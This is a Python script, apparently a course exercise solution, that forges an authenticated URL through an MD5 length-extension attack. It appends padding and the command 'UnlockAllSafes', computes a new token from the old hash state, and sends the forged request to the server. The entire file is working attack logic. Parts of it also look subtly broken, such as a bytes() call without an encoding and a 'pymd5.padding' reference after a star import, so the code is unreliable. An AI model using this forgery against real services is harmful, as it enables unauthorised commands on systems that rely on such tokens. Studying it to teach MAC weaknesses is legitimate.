from pymd5 import *
import http.client, urllib.parse, sys
import math

url = sys.argv[1]

parsedUrl = urllib.parse.urlparse(url)
query = parsedUrl[4].split("&")
token = query[0][6:]

# Reform Old Hash
newQuery = query[1]
for x in query[2:]:
  newQuery = newQuery + "&"
  newQuery = newQuery + x

# Your code to modify url goes here
msglen = (len(newQuery) + 10) * 8
blocksize = math.ceil(msglen/512) * 512
h = md5(state=bytes.fromhex(token), count = blocksize )
x = "&command3=UnlockAllSafes"
h.update(x.encode())
newToken = str(h.hexdigest())

newQuery = urllib.parse.quote(bytes("token=" + newToken + "&") + bytes(newQuery, "UTF-8") + pymd5.padding(int(msglen)) + bytes(x, "UTF-8"))

parsedUrl = urllib.parse.urlparse(url)
reformedUrl = list(parsedUrl)
reformedUrl[4] = newQuery

parsedUrl = urllib.parse.urlunparse(reformedUrl)
parsedUrl = urllib.parse.urlparse(parsedUrl)

conn = http.client.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print(conn.getresponse().read())
